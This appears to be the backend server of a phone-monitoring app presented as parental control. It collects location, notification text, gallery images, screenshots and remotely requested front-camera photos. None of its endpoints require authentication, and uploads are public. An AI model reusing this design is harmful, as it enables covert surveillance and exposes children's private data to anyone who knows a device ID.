const express = require('express');
const multer = require('multer');
const path = require('path');
const fs = require('fs');
const app = express();
const PORT = process.env.PORT || 3000;

// ✅ MIDDLEWARE SETUP
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ IMPORTANT: Static files serve karne ke liye
app.use('/uploads', express.static(path.join(__dirname, 'uploads')));

// ✅ CORS middleware
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    next();
});

// ✅ DATA STORAGE
let connectedDevices = [];
let deviceGalleries = {};
let deviceLocations = {};
let galleryChanges = {};
let deviceNotifications = {};
let frontCameraRequests = {}; // ✅ NEW: Front camera requests storage

// ✅ TIME FORMATTING FUNCTION
function formatSimpleTime(timestamp) {
    try {
        let date;
        
        if (typeof timestamp === 'number') {
            if (timestamp < 10000000000) {
                timestamp = timestamp * 1000;
            }
            date = new Date(timestamp);
        } else {
            date = new Date(timestamp);
        }
        
        const day = String(date.getDate()).padStart(2, '0');
        const month = date.toLocaleString('en', { month: 'short' });
        const year = date.getFullYear();
        const hours = String(date.getHours()).padStart(2, '0');
        const minutes = String(date.getMinutes()).padStart(2, '0');
        const seconds = String(date.getSeconds()).padStart(2, '0');
        const ampm = hours >= 12 ? 'PM' : 'AM';
        
        const formattedHours = String(hours % 12 || 12).padStart(2, '0');
        
        return `${day} ${month} ${year} ${formattedHours}:${minutes}:${seconds} ${ampm}`;
        
    } catch (error) {
        return new Date().toLocaleString();
    }
}

// ✅ MULTER SETUP FOR FILE UPLOADS
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        const uploadsDir = path.join(__dirname, 'uploads');
        if (!fs.existsSync(uploadsDir)) {
            fs.mkdirSync(uploadsDir, { recursive: true });
            console.log('✅ Created uploads directory:', uploadsDir);
        }
        cb(null, uploadsDir);
    },
    filename: function (req, file, cb) {
        const deviceId = req.body.deviceId || 'unknown';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.\-_]/g, '_');
        const filename = `${deviceId}_${timestamp}_${safeName}`;
        console.log('📁 Saving file:', filename);
        cb(null, filename);
    }
});

const upload = multer({ 
    storage: storage,
    limits: {
        fileSize: 10 * 1024 * 1024
    },
    fileFilter: function (req, file, cb) {
        if (file.mimetype.startsWith('image/')) {
            cb(null, true);
        } else {
            cb(new Error('Only image files are allowed!'), false);
        }
    }
});

// ✅ ROOT ROUTE
app.get('/', (req, res) => {
    res.json({
        message: '🚀 Parental Control Server - COMPLETE SYSTEM',
        status: 'Running',
        timestamp: formatSimpleTime(Date.now()),
        endpoints: {
            health: '/health',
            register: '/api/register (POST)',
            batteryUpdate: '/api/battery-update (POST)',
            locationUpdate: '/api/location-update (POST)',
            notificationUpdate: '/api/notification-update (POST)',
            uploadGallery: '/api/upload-gallery (POST)',
            uploadScreenshot: '/api/upload-screenshot (POST)',
            getGallery: '/api/gallery/:deviceId (GET)',
            getScreenshots: '/api/screenshots/:deviceId (GET)',
            getDevices: '/api/devices (GET)',
            testUpload: '/api/test-upload (POST)',
            checkUploads: '/api/check-uploads (GET)',
            // ✅ NOTIFICATION ENDPOINTS
            getNotifications: '/api/notifications/:deviceId (GET)',
            getRecentNotifications: '/api/recent-notifications/:deviceId (GET)',
            clearNotifications: '/api/clear-notifications/:deviceId (DELETE)',
            // ✅ NEW FRONT CAMERA ENDPOINTS
            requestFrontCamera: '/api/request-front-camera (POST)',
            uploadFrontCamera: '/api/upload-front-camera (POST)',
            checkCameraRequest: '/api/check-camera-request/:requestId (GET)',
            getPendingRequests: '/api/pending-camera-requests/:deviceId (GET)'
        }
    });
});

// ✅ HEALTH CHECK
app.get('/health', (req, res) => {
    const uploadsDir = path.join(__dirname, 'uploads');
    const uploadsExists = fs.existsSync(uploadsDir);
    let uploadFileCount = 0;
    
    if (uploadsExists) {
        try {
            uploadFileCount = fs.readdirSync(uploadsDir).length;
        } catch (e) {
            uploadFileCount = -1;
        }
    }

    res.json({ 
        status: 'OK', 
        message: 'Server is running perfectly!',
        timestamp: formatSimpleTime(Date.now()),
        deviceCount: connectedDevices.length,
        galleryDeviceCount: Object.keys(deviceGalleries).length,
        notificationDeviceCount: Object.keys(deviceNotifications).length,
        cameraRequestsCount: Object.keys(frontCameraRequests).length,
        uploads: {
            exists: uploadsExists,
            fileCount: uploadFileCount
        }
    });
});

// ✅ DEVICE REGISTRATION
app.post('/api/register', (req, res) => {
    try {
        const { deviceId, deviceName, batteryLevel } = req.body;
        
        console.log('📱 Device registration:', { deviceId, deviceName, batteryLevel });
        
        if (!deviceId) {
            return res.status(400).json({ 
                success: false,
                error: 'Device ID is required' 
            });
        }
        
        const newDevice = {
            id: deviceId,
            deviceName: deviceName || 'Child Device',
            batteryLevel: batteryLevel || 50,
            status: 'online',
            lastConnected: formatSimpleTime(Date.now()),
            connectedAt: formatSimpleTime(Date.now())
        };
        
        connectedDevices = connectedDevices.filter(device => device.id !== deviceId);
        connectedDevices.push(newDevice);
        
        console.log('✅ Device registered:', deviceId);
        
        res.json({ 
            success: true,
            message: 'Device registered successfully',
            device: newDevice
        });
        
    } catch (error) {
        console.error('❌ Registration error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ BATTERY UPDATE
app.post('/api/battery-update', (req, res) => {
    try {
        const { deviceId, deviceName, batteryLevel, timestamp } = req.body;
        
        console.log('🔋 Battery update:', { deviceId, deviceName, batteryLevel });
        
        if (!deviceId) {
            return res.status(400).json({ 
                success: false,
                error: 'Device ID is required' 
            });
        }
        
        let device = connectedDevices.find(d => d.id === deviceId);
        
        if (device) {
            device.batteryLevel = batteryLevel;
            device.deviceName = deviceName || device.deviceName;
            device.lastConnected = formatSimpleTime(Date.now());
            device.status = 'online';
        } else {
            device = {
                id: deviceId,
                deviceName: deviceName || 'Child Device',
                batteryLevel: batteryLevel,
                status: 'online',
                lastConnected: formatSimpleTime(Date.now()),
                connectedAt: formatSimpleTime(Date.now())
            };
            connectedDevices.push(device);
        }
        
        res.json({ 
            success: true,
            message: 'Battery update received',
            batteryLevel: batteryLevel,
            deviceId: deviceId
        });
        
    } catch (error) {
        console.error('❌ Battery update error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ LOCATION UPDATE
app.post('/api/location-update', (req, res) => {
    try {
        const { 
            deviceId, 
            deviceName, 
            latitude, 
            longitude, 
            accuracy, 
            speed, 
            bearing, 
            altitude, 
            timestamp, 
            updateCount, 
            updateType, 
            provider 
        } = req.body;
        
        console.log('📍 Location update:', { deviceId, latitude, longitude });
        
        if (!deviceId) {
            return res.status(400).json({ 
                success: false,
                error: 'Device ID is required' 
            });
        }

        if (!latitude || !longitude) {
            return res.status(400).json({ 
                success: false,
                error: 'Latitude and longitude are required' 
            });
        }

        if (!deviceLocations[deviceId]) {
            deviceLocations[deviceId] = [];
        }

        const locationData = {
            latitude: parseFloat(latitude),
            longitude: parseFloat(longitude),
            accuracy: accuracy ? parseFloat(accuracy) : null,
            speed: speed ? parseFloat(speed) : null,
            bearing: bearing ? parseFloat(bearing) : null,
            altitude: altitude ? parseFloat(altitude) : null,
            timestamp: timestamp || Date.now(),
            formattedTime: formatSimpleTime(timestamp || Date.now()),
            updateType: updateType || 'LIVE_UPDATE',
            provider: provider || 'unknown'
        };

        deviceLocations[deviceId].push(locationData);
        if (deviceLocations[deviceId].length > 100) {
            deviceLocations[deviceId] = deviceLocations[deviceId].slice(-100);
        }

        let device = connectedDevices.find(d => d.id === deviceId);
        if (device) {
            device.lastLocation = locationData;
            device.lastConnected = formatSimpleTime(Date.now());
            device.status = 'online';
        }

        res.json({ 
            success: true,
            message: 'Location update received',
            deviceId: deviceId,
            locationCount: deviceLocations[deviceId].length
        });
        
    } catch (error) {
        console.error('❌ Location update error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ NOTIFICATION UPDATE (SAVE NOTIFICATIONS)
app.post('/api/notification-update', (req, res) => {
    try {
        const { 
            deviceId, 
            deviceName,
            packageName,
            appName,
            title,
            text,
            timestamp,
            category,
            priority
        } = req.body;
        
        console.log('📢 Notification:', { deviceId, appName, title: title?.substring(0, 30) });
        
        if (!deviceId) {
            return res.status(400).json({ 
                success: false,
                error: 'Device ID is required' 
            });
        }

        if (!title && !text) {
            return res.status(400).json({ 
                success: false,
                error: 'Notification title or text is required' 
            });
        }

        if (!deviceNotifications[deviceId]) {
            deviceNotifications[deviceId] = [];
        }

        const notificationData = {
            id: Date.now().toString(),
            packageName: packageName || 'unknown',
            appName: appName || 'Unknown App',
            title: title || '',
            text: text || '',
            timestamp: timestamp || Date.now(),
            formattedTime: formatSimpleTime(timestamp || Date.now()),
            category: category || 'general',
            priority: priority || 'normal'
        };

        deviceNotifications[deviceId].unshift(notificationData);
        if (deviceNotifications[deviceId].length > 200) {
            deviceNotifications[deviceId] = deviceNotifications[deviceId].slice(0, 200);
        }

        let device = connectedDevices.find(d => d.id === deviceId);
        if (device) {
            device.lastNotification = notificationData;
            device.lastConnected = formatSimpleTime(Date.now());
            device.status = 'online';
        }

        res.json({ 
            success: true,
            message: 'Notification received',
            deviceId: deviceId,
            totalNotifications: deviceNotifications[deviceId].length
        });
        
    } catch (error) {
        console.error('❌ Notification update error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ GET ALL NOTIFICATIONS FOR DEVICE
app.get('/api/notifications/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log('📢 Notifications request for device:', deviceId);

        if (!deviceNotifications[deviceId] || deviceNotifications[deviceId].length === 0) {
            return res.json({ 
                success: true,
                message: 'No notifications found',
                deviceId: deviceId,
                notifications: []
            });
        }

        const notifications = deviceNotifications[deviceId].map(notif => ({
            id: notif.id,
            packageName: notif.packageName,
            appName: notif.appName,
            title: notif.title,
            text: notif.text,
            timestamp: notif.timestamp,
            formattedTime: notif.formattedTime,
            category: notif.category,
            priority: notif.priority
        }));

        console.log('✅ Sending', notifications.length, 'notifications for device:', deviceId);

        res.json({ 
            success: true,
            deviceId: deviceId,
            notificationCount: notifications.length,
            notifications: notifications
        });
        
    } catch (error) {
        console.error('❌ Notifications fetch error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ GET RECENT NOTIFICATIONS (LAST 10)
app.get('/api/recent-notifications/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log('📢 Recent notifications request for device:', deviceId);

        if (!deviceNotifications[deviceId] || deviceNotifications[deviceId].length === 0) {
            return res.json({ 
                success: true,
                message: 'No recent notifications',
                deviceId: deviceId,
                recentNotifications: []
            });
        }

        const recentNotifications = deviceNotifications[deviceId]
            .slice(0, 10) // Last 10 notifications
            .map(notif => ({
                id: notif.id,
                appName: notif.appName,
                title: notif.title,
                text: notif.text,
                formattedTime: notif.formattedTime,
                packageName: notif.packageName
            }));

        res.json({ 
            success: true,
            deviceId: deviceId,
            recentCount: recentNotifications.length,
            recentNotifications: recentNotifications
        });
        
    } catch (error) {
        console.error('❌ Recent notifications error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ CLEAR NOTIFICATIONS FOR DEVICE
app.delete('/api/clear-notifications/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log('🗑️ Clear notifications request for device:', deviceId);

        const deletedCount = deviceNotifications[deviceId] ? deviceNotifications[deviceId].length : 0;
        deviceNotifications[deviceId] = [];

        res.json({ 
            success: true,
            message: 'Notifications cleared successfully',
            deviceId: deviceId,
            deletedCount: deletedCount
        });
        
    } catch (error) {
        console.error('❌ Clear notifications error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ GALLERY UPLOAD
app.post('/api/upload-gallery', upload.single('galleryImage'), (req, res) => {
    try {
        const { deviceId } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ 
                success: false,
                error: 'Device ID is required' 
            });
        }

        if (!req.file) {
            return res.status(400).json({ 
                success: false,
                error: 'No image file uploaded' 
            });
        }

        console.log('📸 Gallery upload from:', deviceId, '| File:', req.file.filename);

        if (!deviceGalleries[deviceId]) {
            deviceGalleries[deviceId] = [];
        }

        const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;

        const imageData = {
            filename: req.file.filename,
            originalName: req.file.originalname,
            path: req.file.path,
            size: req.file.size,
            uploadedAt: formatSimpleTime(Date.now()),
            type: 'photo',
            url: imageUrl
        };

        deviceGalleries[deviceId].push(imageData);

        console.log('✅ Gallery image stored | URL:', imageUrl);

        res.json({ 
            success: true,
            message: 'Gallery image uploaded successfully',
            deviceId: deviceId,
            imageCount: deviceGalleries[deviceId].length,
            imageUrl: imageUrl,
            filename: req.file.filename
        });
        
    } catch (error) {
        console.error('❌ Gallery upload error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ SCREENSHOT UPLOAD
app.post('/api/upload-screenshot', upload.single('screenshot'), (req, res) => {
    try {
        const { deviceId, timestamp } = req.body;
        
        if (!deviceId) {
            return res.status(400).json({ 
                success: false,
                error: 'Device ID is required' 
            });
        }

        if (!req.file) {
            return res.status(400).json({ 
                success: false,
                error: 'No screenshot file uploaded' 
            });
        }

        console.log('📸 Screenshot from:', deviceId, '| File:', req.file.filename);

        if (!deviceGalleries[deviceId]) {
            deviceGalleries[deviceId] = [];
        }

        const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;

        const screenshotData = {
            filename: req.file.filename,
            originalName: req.file.originalname,
            path: req.file.path,
            size: req.file.size,
            uploadedAt: formatSimpleTime(Date.now()),
            type: 'screenshot',
            timestamp: timestamp || Date.now(),
            formattedTime: formatSimpleTime(timestamp || Date.now()),
            url: imageUrl
        };

        deviceGalleries[deviceId].push(screenshotData);

        console.log('✅ Screenshot stored | URL:', imageUrl);

        res.json({ 
            success: true,
            message: 'Screenshot uploaded successfully',
            deviceId: deviceId,
            screenshotCount: deviceGalleries[deviceId].filter(img => img.type === 'screenshot').length,
            imageUrl: imageUrl,
            filename: req.file.filename
        });
        
    } catch (error) {
        console.error('❌ Screenshot upload error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ GET GALLERY IMAGES
app.get('/api/gallery/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log('📸 Gallery request for device:', deviceId);

        if (!deviceGalleries[deviceId] || deviceGalleries[deviceId].length === 0) {
            return res.json({ 
                success: true,
                message: 'No gallery images found',
                deviceId: deviceId,
                images: []
            });
        }

        const images = deviceGalleries[deviceId].map(img => ({
            filename: img.filename,
            originalName: img.originalName,
            size: img.size,
            uploadedAt: img.uploadedAt,
            formattedTime: img.formattedTime || img.uploadedAt,
            type: img.type || 'photo',
            url: img.url || `${req.protocol}://${req.get('host')}/uploads/${img.filename}`
        }));

        console.log('✅ Sending', images.length, 'images for device:', deviceId);

        res.json({ 
            success: true,
            deviceId: deviceId,
            imageCount: images.length,
            images: images
        });
        
    } catch (error) {
        console.error('❌ Gallery fetch error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ GET SCREENSHOTS
app.get('/api/screenshots/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log('📸 Screenshots request for device:', deviceId);

        if (!deviceGalleries[deviceId] || deviceGalleries[deviceId].length === 0) {
            return res.json({ 
                success: true,
                message: 'No screenshots found',
                deviceId: deviceId,
                screenshots: []
            });
        }

        const screenshots = deviceGalleries[deviceId]
            .filter(img => img.type === 'screenshot')
            .map(img => ({
                filename: img.filename,
                originalName: img.originalName,
                size: img.size,
                uploadedAt: img.uploadedAt,
                timestamp: img.timestamp,
                formattedTime: img.formattedTime || formatSimpleTime(img.timestamp),
                url: img.url || `${req.protocol}://${req.get('host')}/uploads/${img.filename}`
            }));

        console.log('✅ Sending', screenshots.length, 'screenshots for device:', deviceId);

        res.json({ 
            success: true,
            deviceId: deviceId,
            screenshotCount: screenshots.length,
            screenshots: screenshots
        });
        
    } catch (error) {
        console.error('❌ Screenshots fetch error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ NEW: REQUEST FRONT CAMERA CAPTURE (Parental App se)
app.post('/api/request-front-camera', (req, res) => {
    try {
        const { deviceId, parentalDeviceId, requestId } = req.body;
        
        console.log('📸 Front camera request:', { deviceId, parentalDeviceId, requestId });
        
        if (!deviceId) {
            return res.status(400).json({ 
                success: false,
                error: 'Device ID is required' 
            });
        }

        // Unique request ID generate karein
        const cameraRequestId = requestId || `cam_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
        
        // Request store karein
        frontCameraRequests[cameraRequestId] = {
            deviceId: deviceId,
            parentalDeviceId: parentalDeviceId,
            requestId: cameraRequestId,
            status: 'pending', // pending, captured, failed
            requestedAt: formatSimpleTime(Date.now()),
            timestamp: Date.now(),
            imageUrl: null,
            message: null
        };

        console.log('✅ Front camera request stored:', cameraRequestId);

        res.json({ 
            success: true,
            message: 'Front camera capture requested',
            requestId: cameraRequestId,
            deviceId: deviceId,
            status: 'pending'
        });
        
    } catch (error) {
        console.error('❌ Front camera request error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ NEW: UPLOAD FRONT CAMERA IMAGE (Child App se)
app.post('/api/upload-front-camera', upload.single('frontCameraImage'), (req, res) => {
    try {
        const { deviceId, requestId } = req.body;
        
        if (!deviceId || !requestId) {
            return res.status(400).json({ 
                success: false,
                error: 'Device ID and Request ID are required' 
            });
        }

        if (!req.file) {
            return res.status(400).json({ 
                success: false,
                error: 'No front camera image uploaded' 
            });
        }

        console.log('📸 Front camera upload:', { deviceId, requestId, file: req.file.filename });

        // Check if request exists
        if (!frontCameraRequests[requestId]) {
            return res.status(404).json({ 
                success: false,
                error: 'Camera request not found' 
            });
        }

        // Update request status
        const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
        
        frontCameraRequests[requestId].status = 'captured';
        frontCameraRequests[requestId].imageUrl = imageUrl;
        frontCameraRequests[requestId].capturedAt = formatSimpleTime(Date.now());
        frontCameraRequests[requestId].filename = req.file.filename;

        console.log('✅ Front camera image uploaded for request:', requestId);

        // Also store in gallery
        if (!deviceGalleries[deviceId]) {
            deviceGalleries[deviceId] = [];
        }

        const cameraImageData = {
            filename: req.file.filename,
            originalName: req.file.originalname,
            path: req.file.path,
            size: req.file.size,
            uploadedAt: formatSimpleTime(Date.now()),
            type: 'front_camera',
            requestId: requestId,
            url: imageUrl
        };

        deviceGalleries[deviceId].push(cameraImageData);

        res.json({ 
            success: true,
            message: 'Front camera image uploaded successfully',
            deviceId: deviceId,
            requestId: requestId,
            status: 'captured',
            imageUrl: imageUrl,
            filename: req.file.filename
        });
        
    } catch (error) {
        console.error('❌ Front camera upload error:', error);
        
        // Mark request as failed
        if (req.body.requestId && frontCameraRequests[req.body.requestId]) {
            frontCameraRequests[req.body.requestId].status = 'failed';
            frontCameraRequests[req.body.requestId].message = error.message;
        }
        
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ NEW: CHECK CAMERA REQUEST STATUS (Parental App se)
app.get('/api/check-camera-request/:requestId', (req, res) => {
    try {
        const { requestId } = req.params;
        
        console.log('📸 Checking camera request:', requestId);

        if (!frontCameraRequests[requestId]) {
            return res.status(404).json({ 
                success: false,
                error: 'Camera request not found' 
            });
        }

        const request = frontCameraRequests[requestId];

        res.json({ 
            success: true,
            requestId: requestId,
            status: request.status,
            deviceId: request.deviceId,
            requestedAt: request.requestedAt,
            capturedAt: request.capturedAt,
            imageUrl: request.imageUrl,
            message: request.message
        });
        
    } catch (error) {
        console.error('❌ Check camera request error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ NEW: GET PENDING CAMERA REQUESTS (Child App se)
app.get('/api/pending-camera-requests/:deviceId', (req, res) => {
    try {
        const { deviceId } = req.params;
        
        console.log('📸 Pending camera requests for device:', deviceId);

        // Find all pending requests for this device
        const pendingRequests = Object.values(frontCameraRequests)
            .filter(request => request.deviceId === deviceId && request.status === 'pending')
            .map(request => ({
                requestId: request.requestId,
                parentalDeviceId: request.parentalDeviceId,
                requestedAt: request.requestedAt,
                timestamp: request.timestamp
            }));

        console.log('✅ Found', pendingRequests.length, 'pending requests for device:', deviceId);

        res.json({ 
            success: true,
            deviceId: deviceId,
            pendingCount: pendingRequests.length,
            pendingRequests: pendingRequests
        });
        
    } catch (error) {
        console.error('❌ Pending camera requests error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ GET ALL DEVICES (WITH NOTIFICATION INFO)
app.get('/api/devices', (req, res) => {
    try {
        console.log('📊 Devices requested. Total:', connectedDevices.length);
        
        const enhancedDevices = connectedDevices.map(device => {
            const locationCount = deviceLocations[device.id] ? deviceLocations[device.id].length : 0;
            const galleryCount = deviceGalleries[device.id] ? deviceGalleries[device.id].length : 0;
            const notificationCount = deviceNotifications[device.id] ? deviceNotifications[device.id].length : 0;
            
            // Count pending camera requests for this device
            const pendingCameraRequests = Object.values(frontCameraRequests)
                .filter(request => request.deviceId === device.id && request.status === 'pending')
                .length;
                
            const lastLocation = deviceLocations[device.id] ? 
                deviceLocations[device.id][deviceLocations[device.id].length - 1] : null;
            const lastNotification = deviceNotifications[device.id] ? 
                deviceNotifications[device.id][0] : null;

            return {
                ...device,
                locationCount: locationCount,
                galleryCount: galleryCount,
                notificationCount: notificationCount,
                pendingCameraRequests: pendingCameraRequests, // ✅ NEW: Pending camera requests count
                lastLocation: lastLocation,
                lastNotification: lastNotification
            };
        });

        res.json({ 
            success: true,
            connectedDevices: enhancedDevices 
        });
    } catch (error) {
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ TEST UPLOAD ENDPOINT
app.post('/api/test-upload', upload.single('testImage'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ 
                success: false,
                error: 'No test image uploaded' 
            });
        }

        const imageUrl = `${req.protocol}://${req.get('host')}/uploads/${req.file.filename}`;
        
        console.log('🧪 Test upload successful:', imageUrl);

        res.json({ 
            success: true,
            message: 'Test upload successful',
            imageUrl: imageUrl,
            filename: req.file.filename
        });
        
    } catch (error) {
        console.error('❌ Test upload error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ CHECK UPLOADS DIRECTORY
app.get('/api/check-uploads', (req, res) => {
    try {
        const uploadsDir = path.join(__dirname, 'uploads');
        const exists = fs.existsSync(uploadsDir);
        
        let files = [];
        if (exists) {
            files = fs.readdirSync(uploadsDir);
        }

        res.json({ 
            success: true,
            uploadsDir: uploadsDir,
            exists: exists,
            fileCount: files.length,
            files: files.slice(0, 10)
        });
        
    } catch (error) {
        console.error('❌ Check uploads error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ GALLERY CHANGES
app.post('/api/gallery-changes', (req, res) => {
    try {
        const { deviceId, action, imagePath, imageType, timestamp } = req.body;
        
        console.log('📸 Gallery change:', { deviceId, action, imageType });
        
        if (!deviceGalleries[deviceId]) {
            deviceGalleries[deviceId] = [];
        }

        if (!galleryChanges[deviceId]) {
            galleryChanges[deviceId] = [];
        }

        const change = {
            action: action,
            imagePath: imagePath,
            imageType: imageType || 'photo',
            timestamp: timestamp || Date.now(),
            reportedAt: formatSimpleTime(Date.now())
        };

        galleryChanges[deviceId].push(change);
        
        if (galleryChanges[deviceId].length > 50) {
            galleryChanges[deviceId] = galleryChanges[deviceId].slice(-50);
        }

        res.json({ 
            success: true,
            message: 'Gallery change recorded'
        });
        
    } catch (error) {
        console.error('❌ Gallery change error:', error);
        res.status(500).json({ 
            success: false,
            error: error.message 
        });
    }
});

// ✅ ERROR HANDLING MIDDLEWARE
app.use((error, req, res, next) => {
    if (error instanceof multer.MulterError) {
        if (error.code === 'LIMIT_FILE_SIZE') {
            return res.status(400).json({
                success: false,
                error: 'File too large. Maximum size is 10MB.'
            });
        }
    }
    res.status(500).json({
        success: false,
        error: error.message
    });
});

// ✅ 404 HANDLER
app.use('*', (req, res) => {
    res.status(404).json({
        success: false,
        error: 'Endpoint not found'
    });
});

// ✅ START SERVER
app.listen(PORT, () => {
    console.log('🚀 Parental Control Server Started!');
    console.log(`📍 Port: ${PORT}`);
    console.log('📸 Features: Battery + Gallery + Location + Notifications + Front Camera');
    console.log('📢 NEW: Front Camera endpoints added!');
    console.log('🖼️ Image URLs: http://your-server.com/uploads/filename.jpg');
    
    // Check uploads directory
    const uploadsDir = path.join(__dirname, 'uploads');
    if (!fs.existsSync(uploadsDir)) {
        fs.mkdirSync(uploadsDir, { recursive: true });
        console.log('✅ Created uploads directory');
    } else {
        const files = fs.readdirSync(uploadsDir);
        console.log('✅ Uploads directory exists with', files.length, 'files');
    }
    
    console.log('✅ Server ready with complete Front Camera system!');
});
